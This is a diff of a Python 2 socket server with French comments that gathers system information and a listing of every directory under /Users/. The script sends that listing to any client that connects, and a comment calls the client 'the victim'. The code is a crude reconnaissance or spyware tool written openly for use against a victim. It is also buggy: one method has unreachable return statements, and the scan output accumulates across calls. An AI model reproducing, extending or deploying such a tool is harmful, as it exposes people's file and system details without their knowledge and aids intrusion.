@@ -1,43 +1,70 @@
-# first of all import the socket library
 import socket
 import subprocess
+import os,sys
+#==========================================================================================
 
-# next create a socket object
+#creation d'une classe pour rendre le programme oriente objet
+class GetInfo:
+    infos = os.uname()
+    currentUser = os.getlogin()
+    rep_actuel = os.getcwd()
+    myDirectory = os.listdir("/Users/")
+    scanpath = "Liste de tous les repertoires dans Users : \n"
+
+    def listInfo(self):
+        #afficher des informations sur le systeme
+        return GetInfo.infos
+        #afficher l'utilisateur actuel
+        return GetInfo.currentUser
+        #afficher le path du repertoire actuel
+        return GetInfo.rep_actuel
+
+    def scan(self):
+        #print "Liste de tous les repertoires dans Users/"
+        #on liste toutes les directories et sous directories
+        for file in GetInfo.myDirectory:
+            GetInfo.scanpath += file + "; \n"
+        return GetInfo.scanpath
+
+#instance de l objet GetInfo (creation de l'objet)
+GetMyInfo = GetInfo()
+# afficage des infos de l'objet
+#GetMyInfo.listInfo()
+#GetMyInfo.scan()
+#==========================================================================================
+# on cree un objet socket
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 print "Socket successfully created"
 
-# reserve a port on your computer in our
-# case it is 12345 but it can be anything
+# reservation d'un port specifique
 port = 12345
 
-# Next bind to the port
-# we have not typed any ip in the ip field
-# instead we have inputted an empty string
-# this makes the server listen to requests
-# coming from other computers on the network
+# contient le nom d hote et le numero du port
+#identifiant le serveur auquel on veut se connecter.
 s.bind(('127.0.0.1', port))
 print "socket binded to %s" %(port)
 
-# put the socket into listening mode
-# nombre maximum de connexions qu'il peut recevoir sur ce port sans les accepter
-
+# activation du mode ecoute
+# avec un nombre maximum de connexions qu il peut recevoir sur ce port sans les accepter
 s.listen(5)
 print "socket is listening"
 
+
+GetMyInfo.scan()
+
+#==========================================================================================
+
 # gestion des erreurs
-# a forever loop until we interrupt it or
-# an error occurs
-
 while True:
-
-   # Establish connection with client.
-   c, addr = s.accept()
+   # on etabli la connection avec le client
+   client, addr = s.accept()
    print 'Got connection from', addr
 
-   # send a thank you message to the client.
-   c.send('Thank you for connecting')
+   #client.send("Liste de tous les repertoires dans Users/")
+   # send the informations about the victim.
+   client.send(GetMyInfo.scan())
 
-   print c.recvfrom(2048)
+   print client.recvfrom(2048)
 
-# Close the connection with the client
-c.close()
+# on ferme la connection
+s.close()
